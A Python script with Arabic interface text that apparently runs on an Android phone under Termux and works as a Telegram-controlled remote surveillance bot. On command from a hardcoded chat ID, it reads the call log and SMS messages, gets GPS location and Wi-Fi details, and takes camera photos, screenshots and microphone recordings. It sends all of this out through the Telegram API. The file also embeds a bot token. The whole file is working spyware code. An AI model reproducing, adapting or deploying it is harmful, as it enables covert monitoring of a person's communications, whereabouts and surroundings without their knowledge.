import subprocess
import json
import requests
import time
import os
import threading
import sys

TOKEN = "8654184216:AAGHSSJTMkKwDYx571UphYM95pX50hcf8os"
MY_CHAT_ID = 1674108077

is_recording = False
recording_lock = threading.Lock()
current_recording_process = None

def send_message_with_keyboard(chat_id, text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "📱 سجل المكالمات", "callback_data": "/calls"},
                {"text": "🎙️ تسجيل صوتي", "callback_data": "/mic_menu"}
            ],
            [
                {"text": "📸 كاميرا خلفية", "callback_data": "/cam"},
                {"text": "🤳 كاميرا أمامية", "callback_data": "/cam_front"}
            ],
            [
                {"text": "📱 لقطة شاشة", "callback_data": "/screenshot"},
                {"text": "📨 رسائل SMS", "callback_data": "/sms"}
            ],
            [
                {"text": "📶 شبكة الواي فاي", "callback_data": "/wifi"},
                {"text": "🔊 مستوى الصوت", "callback_data": "/volume"}
            ],
            [
                {"text": "📊 حالة الجهاز", "callback_data": "/status"},
                {"text": "🔋 تفاصيل البطارية", "callback_data": "/battery_info"}
            ],
            [
                {"text": "📍 الموقع الجغرافي", "callback_data": "/location"}
            ],
            [
                {"text": "🛑 إيقاف المهمة الحالية", "callback_data": "/cancel"},
                {"text": "🔄 تحديث وتنشيط البوت", "callback_data": "/restart"}
            ]
        ]
    }
    try:
        requests.post(url, json={
            "chat_id": chat_id, 
            "text": text, 
            "parse_mode": "Markdown",
            "reply_markup": keyboard
        }, timeout=10)
    except:
        pass

def send_mic_duration_keyboard(chat_id):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "⏱️ 10 ثوانٍ", "callback_data": "/mic_10"},
                {"text": "⏱️ 20 ثانية", "callback_data": "/mic_20"}
            ],
            [
                {"text": "⏱️ 30 ثانية", "callback_data": "/mic_30"},
                {"text": "⏱️ 40 ثانية", "callback_data": "/mic_40"}
            ],
            [
                {"text": "⏱️ 50 ثانية", "callback_data": "/mic_50"},
                {"text": "⏱️ 60 ثانية", "callback_data": "/mic_60"}
            ],
            [
                {"text": "🔙 القائمة الرئيسية", "callback_data": "/start"}
            ]
        ]
    }
    try:
        requests.post(url, json={
            "chat_id": chat_id,
            "text": "🎙️ *اختر مدة التسجيل الصوتي المطلوبة:*",
            "parse_mode": "Markdown",
            "reply_markup": keyboard
        }, timeout=10)
    except:
        pass

def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}, timeout=10)
    except:
        pass

def get_call_logs_report():
    try:
        result = subprocess.check_output("termux-call-log -l 10", shell=True, timeout=15)
        calls = json.loads(result.decode('utf-8', errors='ignore'))
        
        if not calls:
            return "📱 *سجل المكالمات:* لا توجد سجلات متاحة أو أن النظام حظر الوصول."
            
        report = "📱 *سجل المكالمات الأخير:*\n" + "—" * 20 + "\n\n"
        for idx, call in enumerate(reversed(calls), start=1):
            name = call.get('name')
            number = call.get('number', '')
            display_info = name.strip() if name and name.strip() else (number or "رقم غير معروف")
            call_type = call.get('type', '')
            date = call.get('date', '')
            duration = call.get('duration', '0')
            
            type_icon = "↗️ صادرة" if call_type == 'OUTGOING' else ("↙️ واردة" if call_type == 'INCOMING' else ("❌ فائتة" if call_type == 'MISSED' else call_type))

            report += f"*{idx}. {display_info}*\n" \
                      f"   ├ النوع: {type_icon}\n" \
                      f"   ├ الوقت: {date}\n" \
                      f"   └ المدة: {duration} ثانية\n\n"
        return report
    except Exception as e:
        return f"❌ خطأ في جلب السجل: {e}"

def get_device_status():
    try:
        battery_res = subprocess.check_output("termux-battery-status", shell=True, timeout=5)
        battery_data = json.loads(battery_res.decode('utf-8', errors='ignore'))
        percentage = battery_data.get('percentage', 'N/A')
        status = battery_data.get('status', 'N/A')
        
        st = os.statvfs("/data/data/com.termux/files/home")
        free_mb = (st.f_bavail * st.f_frsize) / (1024 * 1024)
        
        report = f"📊 *حالة الجهاز الحالية:*\n" \
                 f"—" * 20 + "\n" \
                 f"🔋 نسبة البطارية: {percentage}%\n" \
                 f"🔌 الحالة: {status}\n" \
                 f"💾 المساحة المتاحة: {free_mb:.2f} MB"
        return report
    except Exception as e:
        return f"❌ خطأ في جلب حالة الجهاز: {e}"

def get_battery_info_report():
    try:
        res = subprocess.check_output("termux-battery-status", shell=True, timeout=5)
        data = json.loads(res.decode('utf-8', errors='ignore'))
        
        health = data.get('health', 'N/A')
        temp = data.get('temperature', 'N/A')
        plugged = data.get('plugged', 'N/A')
        percentage = data.get('percentage', 'N/A')
        
        report = f"🔋 *التفاصيل المتقدمة للبطارية:*\n" \
                 f"—" * 20 + "\n" \
                 f"⚡ النسبة: {percentage}%\n" \
                 f"🌡️ الحرارة: {temp}°C\n" \
                 f"🩺 الحالة الصحية: {health}\n" \
                 f"🔌 مصدر الطاقة: {plugged}"
        return report
    except Exception as e:
        return f"❌ خطأ في جلب تفاصيل البطارية: {e}"

def get_sms_report():
    try:
        res = subprocess.check_output("termux-sms-list -l 5", shell=True, timeout=15)
        messages = json.loads(res.decode('utf-8', errors='ignore'))
        
        if not messages:
            return "📨 *الرسائل القصيرة:* لا توجد رسائل مسجلة."
            
        report = "📨 *آخر 5 رسائل SMS واردة:*\n" \
                 f"—" * 20 + "\n\n"
        for idx, msg in enumerate(messages, start=1):
            sender = msg.get('number', 'مجهول')
            body = msg.get('body', '')
            date = msg.get('date', '')
            
            report += f"*{idx}. المرسل: {sender}*\n" \
                      f"   💬 النص: {body}\n" \
                      f"   ⏱️ الوقت: {date}\n\n"
        return report
    except Exception as e:
        return f"❌ خطأ في جلب الرسائل (تأكد من إذن قراءة الـ SMS): {e}"

def get_wifi_report():
    try:
        wifi_res = subprocess.check_output("termux-wifi-connectioninfo", shell=True, timeout=10)
        wifi_data = json.loads(wifi_res.decode('utf-8', errors='ignore'))
        ssid = wifi_data.get('ssid', 'Unknown')
        bssid = wifi_data.get('bssid', 'N/A')
        ip = wifi_data.get('ip', 'N/A')
        
        report = f"📶 *معلومات شبكة الواي فاي:*\n" \
                 f"—" * 20 + "\n" \
                 f"🌐 اسم الشبكة (SSID): `{ssid}`\n" \
                 f"🔗 عنوان الآيباد (IP): `{ip}`\n" \
                 f"📍 معرف الراوتر (BSSID): `{bssid}`"
        return report
    except Exception as e:
        return f"❌ خطأ في جلب معلومات الواي فاي: {e}"

def get_volume_report():
    try:
        res = subprocess.check_output("termux-volume", shell=True, timeout=10)
        vols = json.loads(res.decode('utf-8', errors='ignore'))
        
        report = f"🔊 *مستويات صوت الجهاز:*\n" \
                 f"—" * 20 + "\n"
        for v in vols:
            stream = v.get('stream', '')
            volume = v.get('volume', '')
            max_v = v.get('max_volume', '')
            report += f"🔹 {stream}: `{volume}/{max_v}`\n"
        return report
    except Exception as e:
        return f"❌ خطأ في جلب مستوى الصوت: {e}"

def get_location_report():
    try:
        send_message(MY_CHAT_ID, "📍 جاري تحديد الموقع الجغرافي...")
        loc_res = subprocess.check_output("termux-location -p gps -c 1", shell=True, timeout=20)
        loc_data = json.loads(loc_res.decode('utf-8', errors='ignore'))
        lat = loc_data.get('latitude')
        lon = loc_data.get('longitude')
        
        if lat and lon:
            map_url = f"https://maps.google.com/?q={lat},{lon}"
            return f"📍 *تم تحديد الموقع بنجاح:*\n🔗 [اضغط هنا لعرض الموقع على الخريطة]({map_url})"
        else:
            return "❌ تعذر الحصول على إحداثيات GPS، تأكد من تفعيل خدمة الموقع."
    except Exception as e:
        return f"❌ خطأ أثناء تحديد الموقع: {e}"

def take_screenshot_task(chat_id):
    screen_path = "/data/data/com.termux/files/home/screen.png"
    try:
        if os.path.exists(screen_path):
            os.remove(screen_path)
            
        send_message(chat_id, "📱 جاري التقاط لقطة الشاشة...")
        cmd = f"termux-screenshot {screen_path}"
        subprocess.run(cmd, shell=True, check=True, timeout=15)
        time.sleep(1)
        
        if os.path.exists(screen_path) and os.path.getsize(screen_path) > 0:
            send_message(chat_id, "📤 يتم الآن إرسال لقطة الشاشة...")
            url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
            with open(screen_path, 'rb') as photo:
                requests.post(url, data={"chat_id": chat_id}, files={"photo": photo}, timeout=30)
        else:
            send_message(chat_id, "❌ فشل التقاط لقطة الشاشة.")
    except Exception as e:
        send_message(chat_id, f"❌ حدث خطأ: {e}")
    finally:
        send_message_with_keyboard(chat_id, "✨ *القائمة الرئيسية جاهزة:*")

def background_mic_task(chat_id, duration_seconds):
    global is_recording, current_recording_process
    audio_path = "/data/data/com.termux/files/home/mic_recording.m4a"
    
    with recording_lock:
        is_recording = True

    try:
        if os.path.exists(audio_path):
            os.remove(audio_path)
            
        send_message(chat_id, f"🎙️ جاري التسجيل الصوتي (لمدة {duration_seconds} ثانية)...")
        
        current_recording_process = subprocess.Popen(f"termux-microphone-record -f {audio_path}", shell=True)
        
        elapsed = 0
        while elapsed < duration_seconds:
            if not is_recording:
                break
            time.sleep(1)
            elapsed += 1
        
        subprocess.run("termux-microphone-record -q", shell=True)
        if current_recording_process:
            current_recording_process.terminate()
        time.sleep(1)
        
        if is_recording and os.path.exists(audio_path) and os.path.getsize(audio_path) > 0:
            send_message(chat_id, "📤 يتم الآن رفع وإرسال التسجيل الصوتي...")
            url = f"https://api.telegram.org/bot{TOKEN}/sendAudio"
            with open(audio_path, 'rb') as audio:
                requests.post(url, data={"chat_id": chat_id}, files={"audio": audio}, timeout=30)
        elif is_recording:
            send_message(chat_id, "❌ لم يتم العثور على الملف الصوتي.")
            
    except Exception as e:
        send_message(chat_id, f"❌ حدث خطأ أثناء التسجيل: {e}")
    finally:
        with recording_lock:
            is_recording = False
            current_recording_process = None
        send_message_with_keyboard(chat_id, "✨ *القائمة الرئيسية جاهزة:*")

def take_photo_task(chat_id, camera_id="0"):
    photo_path = f"/data/data/com.termux/files/home/photo_{camera_id}.jpg"
    cam_name = "الكاميرا الخلفية" if camera_id == "0" else "الكاميرا الأمامية"
    try:
        if os.path.exists(photo_path):
            os.remove(photo_path)
            
        send_message(chat_id, f"📸 جاري التقاط الصورة ({cam_name})...")
        
        cmd = f"termux-camera-photo -c {camera_id} {photo_path}"
        subprocess.run(cmd, shell=True, check=True, timeout=15)
        time.sleep(1)
        
        if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
            send_message(chat_id, "📤 يتم الآن إرسال الصورة...")
            url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
            with open(photo_path, 'rb') as photo:
                requests.post(url, data={"chat_id": chat_id}, files={"photo": photo}, timeout=30)
        else:
            send_message(chat_id, "❌ فشل التقاط الصورة.")
            
    except Exception as e:
        send_message(chat_id, f"❌ حدث خطأ: {e}")
    finally:
        send_message_with_keyboard(chat_id, "✨ *القائمة الرئيسية جاهزة:*")

def handle_task(chat_id, target_func):
    report = target_func()
    send_message(chat_id, report)
    send_message_with_keyboard(chat_id, "✨ *القائمة الرئيسية جاهزة:*")

def notify_startup():
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        text = "🟢 *تم الاتصال بنجاح على الجهاز!*\nالبوت يعمل الآن بكفاءة ومستعد لاستقبال الأوامر."
        requests.post(url, json={"chat_id": MY_CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=10)
    except:
        pass

def main():
    global is_recording, current_recording_process
    print("🤖 البوت يعمل بانتظار الأوامر...")
    
    notify_startup()
    
    offset = 0
    boot_sent = True 
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset}&timeout=30"
            response = requests.get(url, timeout=35)
            data = response.json()
            
            if data.get("ok"):
                boot_sent = True 
                for update in data.get("result", []):
                    offset = update["update_id"] + 1
                    
                    chat_id = None
                    text = ""
                    
                    if "callback_query" in update:
                        callback = update["callback_query"]
                        chat_id = callback["message"]["chat"]["id"]
                        text = callback["data"]
                        try:
                            requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={"callback_query_id": callback["id"]}, timeout=5)
                        except:
                            pass
                    elif "message" in update:
                        message = update["message"]
                        chat_id = message.get("chat", {}).get("id")
                        text = message.get("text", "").strip()
                    
                    if chat_id == MY_CHAT_ID:
                        if text == "/cancel":
                            if is_recording:
                                is_recording = False
                                try:
                                    subprocess.run("termux-microphone-record -q", shell=True)
                                    if current_recording_process:
                                        current_recording_process.terminate()
                                except:
                                    pass
                                send_message(chat_id, "🛑 تم إلغاء التسجيل الجاري وإيقافه.")
                            else:
                                send_message(chat_id, "ℹ️ لا توجد عمليات تسجيل معلقة لإلغائها.")
                            send_message_with_keyboard(chat_id, "✨ *القائمة الرئيسية جاهزة:*")
                                
                        elif text == "/restart":
                            send_message(chat_id, "🔄 تم تنشيط البوت وتحديث الاتصال بنجاح!")
                            send_message_with_keyboard(chat_id, "✨ *القائمة الرئيسية جاهزة:*")
                            
                        elif text == "/calls":
                            send_message(chat_id, "⏳ جاري سحب سجل المكالمات...")
                            threading.Thread(target=handle_task, args=(chat_id, get_call_logs_report)).start()
                            
                        elif text == "/mic_menu":
                            if is_recording:
                                send_message(chat_id, "⚠️ الهاتف مشغول بالتسجيل بالفعل!")
                                send_message_with_keyboard(chat_id, "✨ *القائمة الرئيسية جاهزة:*")
                            else:
                                send_mic_duration_keyboard(chat_id)
                                
                        elif text in ["/mic_10", "/mic_20", "/mic_30", "/mic_40", "/mic_50", "/mic_60"]:
                            if is_recording:
                                send_message(chat_id, "⚠️ الهاتف مشغول بالتسجيل حالياً!")
                                send_message_with_keyboard(chat_id, "✨ *القائمة الرئيسية جاهزة:*")
                            else:
                                duration_map = {"/mic_10": 10, "/mic_20": 20, "/mic_30": 30, "/mic_40": 40, "/mic_50": 50, "/mic_60": 60}
                                secs = duration_map.get(text, 10)
                                threading.Thread(target=background_mic_task, args=(chat_id, secs)).start()
                                
                        elif text == "/cam":
                            threading.Thread(target=take_photo_task, args=(chat_id, "0")).start()
                            
                        elif text == "/cam_front":
                            threading.Thread(target=take_photo_task, args=(chat_id, "1")).start()

                        elif text == "/screenshot":
                            threading.Thread(target=take_screenshot_task, args=(chat_id,)).start()

                        elif text == "/sms":
                            send_message(chat_id, "⏳ جاري قراءة رسائل SMS...")
                            threading.Thread(target=handle_task, args=(chat_id, get_sms_report)).start()

                        elif text == "/wifi":
                            threading.Thread(target=handle_task, args=(chat_id, get_wifi_report)).start()

                        elif text == "/volume":
                            threading.Thread(target=handle_task, args=(chat_id, get_volume_report)).start()
                            
                        elif text == "/status":
                            threading.Thread(target=handle_task, args=(chat_id, get_device_status)).start()

                        elif text == "/battery_info":
                            threading.Thread(target=handle_task, args=(chat_id, get_battery_info_report)).start()
                            
                        elif text == "/location":
                            threading.Thread(target=handle_task, args=(chat_id, get_location_report)).start()
                            
                        elif text == "/start":
                            send_message_with_keyboard(chat_id, 
                                "🌟 *أهلاً بك يا باسم في لوحة التحكم المركزية الذكية.*\n\n"
                                "النظام يعمل بكفاءة تامة ومستقر.\n"
                                "اختر الخدمة المطلوبة مباشرة من الأزرار أدناه:"
                            )
                        else:
                            send_message(chat_id, "❓ أمر غير معروف. اضغط أو اكتب `/start` لعرض لوحة التحكم.")
                            send_message_with_keyboard(chat_id, "✨ *القائمة الرئيسية جاهزة:*")
        except Exception as e:
            if boot_sent:
                boot_sent = False 
            time.sleep(5)
            
        time.sleep(1)

if __name__ == "__main__":
    main()